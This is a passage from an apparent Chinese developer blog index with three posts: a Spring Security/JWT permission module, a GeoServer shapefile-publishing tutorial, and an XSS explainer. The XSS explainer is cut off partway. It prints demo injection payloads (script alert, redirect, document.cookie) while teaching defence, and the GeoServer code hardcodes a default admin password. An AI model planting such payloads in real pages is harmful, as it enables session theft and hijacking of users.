UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 通过验证，在Spring Security上下文中写入用户登录相关所有信息 SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 如何根据token获取登录用户信息\n核心：从request解析token获取其中的userId，到redis中根据userId获取用户信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 /** * 获取用户身份信息 * * @return 用户信息 */ public LoginUser getLoginUser(HttpServletRequest request) { // 获取请求携带的令牌 String token = getToken(request); if (StringUtils.isNotEmpty(token)) { try { Claims claims = parseToken(token); // 解析对应的权限以及用户信息 String uuid = (String) claims.get(Constants.LOGIN_USER_KEY); String userKey = getTokenKey(uuid); LoginUser user = redisCache.get(userKey); return user; } catch (Exception e) { log.error(e.getMessage()); } } return null; } /** * 令牌前缀 */ public static final String TOKEN_PREFIX = \u0026#34;Bearer \u0026#34;; /** * 获取请求token * * @param request * @return token */ private String getToken(HttpServletRequest request) { String token = request.getHeader(header); if (StringUtils.isNotEmpty(token) \u0026amp;\u0026amp; token.startsWith(Constants.TOKEN_PREFIX)) { token = token.replace(Constants.TOKEN_PREFIX, \u0026#34;\u0026#34;); } return token; } /** * 从令牌中获取数据声明 * * @param token 令牌 * @return 数据声明 */ private Claims parseToken(String token) { return Jwts.parser() .setSigningKey(secret) .parseClaimsJws(token) .getBody(); } 2.4 配置SecurityConfig 在SecurityConfig中注入：\nLogoutSuccessHandlerImpl 自定义实现的UserDetailsService JwtAuthenticationTokenFilter AuthenticationEntryPoint CorsFilter \u0026hellip; 以及相关权限控制configure\n完整spring security配置如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 /** * spring security配置 * * @author 7bin */ @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类（抛出AuthenticationException异常走这里） */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // anonymous() :匿名访问, 仅允许匿名用户访问, 如果登录认证后, 带有token信息再去请求, 这个anonymous()关联的资源就不能被访问， // permitAll() :登录能访问,不登录也能访问, 一般用于静态资源js等 // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;,\u0026#34;/docker/**\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 2.5 思考 什么时候会走到认证失败的处理类呢（还不知道）\nhttpSecurity.exceptionHandling().authenticationEntryPoint(unauthorizedHandler)\nAuthenticationException异常详解\n3 授权 3.1 RBAC权限模型 RBAC权限模型（Role-Based Access Control）即：基于角色的权限控制。这是目前最常被开发者使用也是相对易用、通用权限模型。\n3.1.1 数据库表结构 如下图是RBAC权限模型各表的基本属性\n当判断某个用户是否拥有某个权限的时候，可根据user_role表获取到该user关联的role，之后可根据role_menu表获取到该role能够访问的menu（权限）\n3.1.2 如何获取用户具有哪些权限？ 在用户登录的时候（loadUserByUsername方法中），将权限信息写入LoginUser中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user, permissionService.getMenuPermission(user)); } PermissionService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /** * 获取菜单数据权限 * * @param user 用户信息 * @return 菜单权限信息 */ public Set\u0026lt;String\u0026gt; getMenuPermission(SysUser user) { Set\u0026lt;String\u0026gt; perms = new HashSet\u0026lt;String\u0026gt;(); // 管理员拥有所有权限 if (user.isAdmin()) { perms.add(\u0026#34;*:*:*\u0026#34;); } else { List\u0026lt;SysRole\u0026gt; roles = user.getRoles(); if (!roles.isEmpty() \u0026amp;\u0026amp; roles.size() \u0026gt; 1) { // 多角色设置permissions属性，以便数据权限匹配权限 for (SysRole role : roles) { Set\u0026lt;String\u0026gt; rolePerms = menuService.selectMenuPermsByRoleId(role.getRoleId()); role.setPermissions(rolePerms); perms.addAll(rolePerms); } } else { perms.addAll(menuService.selectMenuPermsByUserId(user.getUserId())); } } return perms; } Mapper\n1 2 3 4 5 6 7 8 \u0026lt;select id=\u0026#34;selectMenuPermsByUserId\u0026#34; parameterType=\u0026#34;Long\u0026#34; resultType=\u0026#34;String\u0026#34;\u0026gt; select distinct m.perms from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role r on r.role_id = ur.role_id where m.status = \u0026#39;0\u0026#39; and r.status = \u0026#39;0\u0026#39; and ur.user_id = #{userId} \u0026lt;/select\u0026gt; 3.2 @PreAuthorize SpringSecurity为我们提供了基于注解的权限控制方案，这也是我们项目中主要采用的方式。我们可以使用注解去指定访问对应的资源所需的权限。\n但是要使用它我们需要先开启相关配置。\n1 @EnableGlobalMethodSecurity(prePostEnabled = true) 然后就可以使用对应的注解：@PreAuthorize\nSpringBoot - @PreAuthorize注解详解\n3.3 自定义权限 3.2.1 注解如何使用？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * 状态修改 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:user:edit\u0026#39;)\u0026#34;) @Log(title = \u0026#34;用户管理\u0026#34;, businessType = BusinessType.UPDATE) @PutMapping(\u0026#34;/status\u0026#34;) public ApiResponse changeStatus(@RequestBody SysUser user) { userService.checkUserAllowed(user); SysUser sysUser = new SysUser(); sysUser.setUserId(user.getUserId()); sysUser.setStatus(user.getStatus()); user.setUpdateBy(getUsername()); return affectRows(userService.updateUserStatus(user)); } 3.2.2 自定义权限实现 @PreAuthorize(\u0026quot;@ss.hasPermi('system:user:edit')\u0026quot;)的意思是什么？\nA. ss 是一个注册在 Spring容器中的Bean；\nB. hasPermi 是PermissionService类中定义的方法；\nC.当Spring EL 表达式返回True，则权限校验通过；\n在hasPermi方法中，获取当前用户权限loginUser.getPermissions()，与传入的permission作比较，看传入的permission是否在loginUser的permissions集合中\nPermissionService.java的定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService{ /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } PermissionContextHolder.setContext(permission); return hasPermissions(loginUser.getPermissions(), permission); } } 3.2.3 如何使用原生的权限？ 3.4 前端权限校验 3.4.1 自定义指令-Directives 使用vue的自定义指令-Directives实现前端根据权限决定是否渲染操作组件\n创建操作权限Directive以及角色权限Directive\n根据用户拥有的permissions以及roles决定是否渲染被相应自定义组件标注的操作组件\nsrc/directive/permission/index.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import type { Directive, DirectiveBinding } from \u0026#34;vue\u0026#34;; import useUserStore from \u0026#34;@/stores/modules/user\u0026#34;; /** * 操作权限处理 */ export const hasPermi: Directive = { mounted(el: HTMLElement, binding: DirectiveBinding) { const { value } = binding; const all_permission = \u0026#34;*:*:*\u0026#34;; const store = useUserStore(); const permissions = store.permissions; if (value \u0026amp;\u0026amp; value instanceof Array \u0026amp;\u0026amp; value.length \u0026gt; 0) { const permissionFlag = value; const hasPermissions = permissions.some((permission: string) =\u0026gt; { return all_permission === permission || permissionFlag.includes(permission); }); if (!hasPermissions) { el.parentNode \u0026amp;\u0026amp; el.parentNode.removeChild(el); } } else { throw new Error(`请设置操作权限标签值`); } } }; /** * 角色权限处理 */ export const hasRole: Directive = { mounted(el: HTMLElement, binding: DirectiveBinding) { const { value } = binding; const super_admin = \u0026#34;admin\u0026#34;; const store = useUserStore(); const roles = store.roles; if (value \u0026amp;\u0026amp; value instanceof Array \u0026amp;\u0026amp; value.length \u0026gt; 0) { const roleFlag = value; const hasRole = roles.some((role: string) =\u0026gt; { return super_admin === role || roleFlag.includes(role); }); if (!hasRole) { el.parentNode \u0026amp;\u0026amp; el.parentNode.removeChild(el); } } else { throw new Error(`请设置角色权限标签值\u0026#34;`); } } }; 3.4.2 全局注册自定义指令 src/directive/index.ts\n1 2 3 4 5 6 7 8 import { hasRole, hasPermi } from \u0026#34;./permission\u0026#34;; import type { App } from \u0026#34;@vue/runtime-core\u0026#34;; export default function directive(app: App) { app.directive(\u0026#34;hasRole\u0026#34;, hasRole); app.directive(\u0026#34;hasPermi\u0026#34;, hasPermi); } main.ts\n1 2 3 const app = createApp(App); import directive from \u0026#34;./directive\u0026#34;; // directive directive(app); 3.4.3 使用自定义指令 例如 v-hasPermi=\u0026quot;['system:role:add']\u0026quot;\n会根据当前用户是否具有 'system:role:add' 操作权限来决定是否渲染button\n1 2 3 4 5 6 7 8 \u0026lt;el-button type=\u0026#34;primary\u0026#34; plain icon=\u0026#34;Plus\u0026#34; style=\u0026#34;margin-right: 30px\u0026#34; @click=\u0026#34;handleAdd\u0026#34; v-hasPermi=\u0026#34;[\u0026#39;system:role:add\u0026#39;]\u0026#34; \u0026gt;新增角色\u0026lt;/el-button\u0026gt; ","permalink":"https://chance7bin.github.io/posts/design/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0/","summary":"0 引言 该篇文章是对Spring Security学习的总结，以及系统中认证授权的代码实现 参考链接 SpringSecurity-从入门到精通 1 Spring","title":"权限管理模块实现"},{"content":"1. 引入geoserver依赖 1 2 3 4 5 6 \u0026lt;!--geoserver依赖--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;nl.pdok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;geoserver-manager\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0-pdok2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2. 流程 （1）创建geoserver连接对象\n（2）创建工作区，有则不创建\n（3）创建数据源和发布图层服务\n（4）mapbox加载WMS服务\n3. Java代码 3.1 geoserver创建连接信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 String url = \u0026#34;http://172.21.212.240:8008/geoserver\u0026#34;; //geoserver的地址 String un = \u0026#34;admin\u0026#34;; //geoserver的账号 String pw = \u0026#34;geoserver\u0026#34;; //geoserver的密码 String workspace = \u0026#34;shapefile\u0026#34;; //工作区名称 String storename = \u0026#34;test\u0026#34;; //数据源名称 String layername = \u0026#34;bus_point\u0026#34;; //发布的图层名称，此名称必须和压缩包的名称一致 //shp文件压缩包，必须是zip压缩包，且shp文件(.shp、.dbf、.shx等)外层不能有文件夹，且压缩包名称需要与shp图层名称一致 String zipFilePath = \u0026#34;E:\\\\GIS_Data\\\\chengdu\\\\bus_point.zip\u0026#34;; // 1、获取geoserver连接对象 GeoServerRESTManager manager = null; try { manager = new GeoServerRESTManager(new URL(url) , un , pw); System.out.println(\u0026#34;连接geoserver服务器成功\u0026#34;); }catch (Exception e){ e.printStackTrace(); System.out.println(\u0026#34;geoserver服务器连接失败\u0026#34;); return; } 3.2 manager中重要的几个类对象 geoserver-manager中几个重要的类对象\n1.GeoServerRESTManager该对象是一个最大的管理者可以获取以下两个对象，创建数据存储\n2.GeoServerRESTPublisher，发布对象，用来发布各种数据和创建工作空间（主要用来创建对象）\n3.GeoServerRESTReader，获取数据存储、图层、样式、图层组等（主要用来获取信息）\n1 2 3 GeoServerRESTReader reader = manager.getReader(); GeoServerRESTPublisher publisher = manager.getPublisher(); GeoServerRESTStoreManager storeManager = manager.getStoreManager(); 3.3 创建工作区 1 2 3 4 5 6 7 8 9 // 2、判断是否有工作区，没有则创建 boolean b2 = reader.existsWorkspace(workspace); if(!b2){ boolean b = publisher.createWorkspace(workspace); if(!b){ System.out.println(\u0026#34;工作区创建失败\u0026#34;); return; } } 3.4 添加style样式 1 2 3 4 5 6 7 8 9 10 // style样式 String styleName = \u0026#34;styletest\u0026#34;; String styleSld; // 判断是否已经发布了style if (!reader.existsStyle(workspace, styleName)) { String styleFilePath = \u0026#34;Z:\\\\GIStone\\\\SuperMap\\\\Server\\\\webapps\\\\iserver\\\\WEB-INF\\\\config\\\\region.sld\u0026#34;; File styleFile = new File(styleFilePath); publisher.publishStyleInWorkspace(workspace, styleFile, styleName); } styleSld = reader.getSLD(workspace, styleName); style样式引入的sld文件。SLD是风格化图层描述器（Styled Layer Descriptor）的简称。SLD描述了如何在WMS规范的基础上进行扩展使之支持用户对要素数据进行自定义的符号化显示。SLD是一种基于XML语言的OGC标准。这表示SLD文件会被GeoServer创建并且能够被任何一种支持WMS的服务器软件所支持。我们不想限制大家渲染地图的方式，因此我们使用OGC标准规定的SLD作为GeoServer的渲染系统的核心。\n3.5 创建数据源 3.6 发布图层服务 创建数据源 和 发布图层服务可以一步进行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 3、判断是否有数据源，没有则创建 // 4、发布图层，如果存在就不发布 // 创建数据源 和 发布图层服务可以一步进行 RESTDataStore datastore = reader.getDatastore(workspace, storename); RESTLayer layer = reader.getLayer(workspace, layername); if(layer == null \u0026amp;\u0026amp; datastore == null){ File file = new File(zipFilePath); // 进行发布；参数依次为：工作区名称、数据源名称、图层名称、shp文件压缩文件对象、坐标系 boolean b = false; try { b = publisher.publishShp(workspace , storename , layername , file , GeoServerRESTPublisher.DEFAULT_CRS); } catch (FileNotFoundException e) { e.printStackTrace(); } if(!b){ System.out.println(\u0026#34;shp图层发布失败\u0026#34;); } else { System.out.println(\u0026#34;shp图层发布成功\u0026#34;); } } 3.7 发布完成 3.8 注意事项 layer图层的名称一定要与shp文件的名称一样。\n如果需要用到压缩文件，压缩文件只能为zip格式，不能是rar格式否则会报错，而且压缩文件的路径是全路径。\n参考链接\nJava将shp文件发布为geoserver服务\nJava实现GeoServer通过rest发布shp至WMS服务\n4. mapbox加载WMS WMS服务地址：\nworkspace：geoserver工作空间\nlayername：图层名称（与zip包以及其中的shp文件名称一直）\n1 \u0026#34;http://localhost:8008/geoserver/\u0026#34; + workspace + \u0026#34;/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=\u0026#34; + workspace + \u0026#34;:\u0026#34; + layername + \u0026#34;\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#34;; html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;MapBox加载WMS地图服务\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.css\u0026#39; rel=\u0026#39;stylesheet\u0026#39; /\u0026gt; \u0026lt;style\u0026gt; body { margin:0; padding:0; } #map { position:absolute; top:0; bottom:0; width:100%; } /*隐藏logo*/ .mapboxgl-ctrl.mapboxgl-ctrl-attrib{ display: none !important; } .mapboxgl-ctrl-logo{ display: none !important; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#39;map\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script \u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXR...BIZtZg\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, center: [108.438,34.431], zoom: 7 }); map.on(\u0026#34;load\u0026#34;,function () { map.addLayer({ \u0026#39;id\u0026#39;: \u0026#39;wms-test-layer\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;source\u0026#39;: { \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;tiles\u0026#39;: [ // \u0026#34;http://127.0.0.1:8008/geoserver/shapefile/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=shapefile:bus_point\u0026amp;tiled=true\u0026amp;srsname=EPSG:4326\u0026#34; \u0026#39;http://localhost:8008/geoserver/shapefile/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=shapefile:bus_point\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#39; ], \u0026#39;tileSize\u0026#39;: 256 }, \u0026#39;paint\u0026#39;: {} }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 效果预览\n参考链接\nMapBox加载GeoServer发布的WMS地图服务\nMapbox GL 加载GeoServer发布的WMS地图服务及点击查询\nopenLayers 坐标转换 EPSG:3857和EPSG:4326区别\n","permalink":"https://chance7bin.github.io/posts/map/java%E4%BD%BF%E7%94%A8geoserver%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1. 引入geoserver依赖 1 2 3 4 5 6 \u0026lt;!--geoserver依赖--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;nl.pdok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;geoserver-manager\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0-pdok2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2. 流程 （1）创建geoserver连接对象","title":"Java使用Geoserver发布地图服务"},{"content":" XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。\nXSS 简介 举一个简单的例子，就是留言板。我们知道留言板通常的任务就是把用户留言的内容展示出来。正常情况下，用户的留言都是正常的语言文字，留言板显示的内容也就没毛病。然而这个时候如果有人不按套路出牌，在留言内容中丢进去一行\n1 \u0026lt;script\u0026gt;alert(\u0026#34;aaa\u0026#34;)\u0026lt;/script\u0026gt; 那么留言板界面的网页代码就会变成形如以下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Board\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;board\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(\u0026#34;aaa\u0026#34;)\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 那么这个时候问题就来了，当浏览器解析到用户输入的代码那一行时会发生什么呢？答案很显然，浏览器并不知道这些代码改变了原本程序的意图，会照做弹出一个信息框。\n既然能够执行脚本，那么，这些脚本完全可以是：\n链接劫持 1 \u0026lt;script\u0026gt;window.location.href=\u0026#34;http://www.baidu.com\u0026#34;;\u0026lt;/script\u0026gt; 盗取cookie 1 \u0026lt;script\u0026gt;alert(\u0026#34;document.cookie\u0026#34;);\u0026lt;/script\u0026gt; 对于攻击者来说，能够让受害者浏览器执行恶意代码的唯一方式，就是把代码注入到受害者从网站下载的网页中, 这就是xss攻击。\nXSS 攻击类型 通常XSS攻击分为：反射型xss攻击, 存储型xss攻击 和 DOM型xss攻击。同时注意以下例子只是简单的向你解释这三种类型的攻击方式而已，实际情况比这个复杂，具体可以再结合最后一节深入理解。\n反射型xss攻击 反射型的攻击需要用户主动的去访问带攻击的链接，攻击者可以通过邮件或者短信的形式，诱导受害者点开链接。如果攻击者配合短链接URL，攻击成功的概率会更高。\n在一个反射型XSS攻击中，恶意文本属于受害者发送给网站的请求中的一部分。随后网站又把恶意文本包含进用于响应用户的返回页面中，发还给用户。\n1、用户误点开了带攻击的url : http://xxx?name=\u0026lt;script\u0026gt;alert('aaa')\u0026lt;/script\u0026gt;\n2、网站给受害者的返回中正常的网页\n3、用户的浏览器收到文本后执行页面合法脚本，这时候页面恶意脚本会被执行，会在网页中弹窗aaa\n这种攻击方式发生在我们合法的js执行中，服务器无法检测我们的请求是否有攻击的危险\n存储型xss攻击 这种攻击方式恶意代码会被存储在数据库中，其他用户在正常访问的情况下，也有会被攻击，影响的范围比较大。\n1、攻击者通过评论表单提交将\u0026lt;script\u0026gt;alert(‘aaa’)\u0026lt;/script\u0026gt;提交到网站\n2、网站后端对提交的评论数据不做任何操作，直接存储到数据库中\n3、其他用户访问正常访问网站，并且需要请求网站的评论数据\n4、网站后端会从数据库中取出数据，直接返回给用户\n5、用户得到页面后，直接运行攻击者提交的代码\u0026lt;script\u0026gt;alert(‘aaa’)\u0026lt;/script\u0026gt;，所有用户都会在网页中弹出aaa的弹窗\nDOM型xss攻击 基于DOM的XSS攻击是反射型攻击的变种。服务器返回的页面是正常的，只是我们在页面执行js的过程中，会把攻击代码植入到页面中。\n1、用户误点开了带攻击的url : http://xxx?name=\u0026lt;script\u0026gt;alert('aaa')\u0026lt;/script\u0026gt;\n2、网站给受害者的返回中正常的网页\n3、用户的浏览器收到文本后执行页面合法脚本，这时候页面恶意脚本会被执行，会在网页中弹窗aaa\n这种攻击方式发生在我们合法的js执行中，服务器无法检测我们的请求是否有攻击的危险\nXSS 攻击的危害 通过document.cookie盗取cookie 使用js或css破坏页面正常的结构与样式 流量劫持（通过访问某段具有window.location.href定位到其他页面） Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。 DOS（拒绝服务）客户端浏览器。 钓鱼攻击，高级的钓鱼技巧。 劫持用户Web行为，甚至进一步渗透内网。 蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据 通过xss盗用cookie危害是什么？ csrf攻击其实是不能盗用cookie的，它只是以当前的名义进行恶意操作；而xss攻击是可以直接盗用cookie。\n那盗用cookie的危害是什么？比如拿到用户的cookie信息，然后传送到攻击者自己的服务器，从cookie中提取敏感信息，拿到用户的登录信息，或者攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。\n这就是为什么cookie也是要防御的\nXSS 攻击的防御 XSS攻击其实就是代码的注入。用户的输入被编译成恶意的程序代码。所以，为了防范这一类代码的注入，需要确保用户输入的安全性。对于攻击验证，我们可以采用以下两种措施：\n编码，就是转义用户的输入，把用户的输入解读为数据而不是代码 校验，对用户的输入及请求都进行过滤检查，如对特殊字符进行过滤，设置输入域的匹配规则等。 具体比如：\n对于验证输入，我们既可以在服务端验证，也可以在客户端验证 对于持久性和反射型攻击，服务端验证是必须的，服务端支持的任何语言都能够做到 对于基于DOM的XSS攻击，验证输入在客户端必须执行，因为从服务端来说，所有发出的页面内容是正常的，只是在客户端js代码执行的过程中才发生可攻击 但是对于各种攻击方式，我们最好做到客户端和服务端都进行处理。 其它还有一些辅助措施，比如：\n入参长度限制： 通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。 设置cookie http-only为true 验证输入 自定义@Xss注解，将定义的Xss注解放在字段或者方法的上方\n@Xss注解\n1 2 3 4 5 6 7 8 9 